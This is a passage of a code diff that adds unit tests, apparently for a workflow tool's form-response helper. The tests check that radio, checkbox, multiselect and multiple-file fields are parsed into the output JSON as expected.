+		addFormResponseDataToReturnItem(returnItem, formFields, bodyData);
+		expect(returnItem.json['Radio Field']).toEqual('option1');
+	});
+
+	it('should parse checkboxes fields from JSON', () => {
+		const formFields: FormFieldsParameter = [{ fieldLabel: 'Checkboxes', fieldType: 'checkbox' }];
+		const bodyData: IDataObject = { 'field-0': '["option1", "option2"]' };
+
+		addFormResponseDataToReturnItem(returnItem, formFields, bodyData);
+		expect(returnItem.json['Checkboxes']).toEqual(['option1', 'option2']);
+	});
+
+	it('should parse multiselect fields from JSON', () => {
+		const formFields: FormFieldsParameter = [
+			{ fieldLabel: 'Multi Field', fieldType: 'text', multiselect: true },
+		];
+		const bodyData: IDataObject = { 'field-0': '["option1", "option2"]' };
+
+		addFormResponseDataToReturnItem(returnItem, formFields, bodyData);
+		expect(returnItem.json['Multi Field']).toEqual(['option1', 'option2']);
+	});
+
+	it('should convert single file values to an array if multipleFiles is true', () => {
+		const formFields: FormFieldsParameter = [
+			{ fieldLabel: 'File Field', fieldType: 'file', multipleFiles: true },
+		];
+		const bodyData: IDataObject = { 'field-0': 'file1.pdf' };
+
+		addFormResponseDataToReturnItem(returnItem, formFields, bodyData);
+		expect(returnItem.json['File Field']).toEqual(['file1.pdf']);
 	});
 });
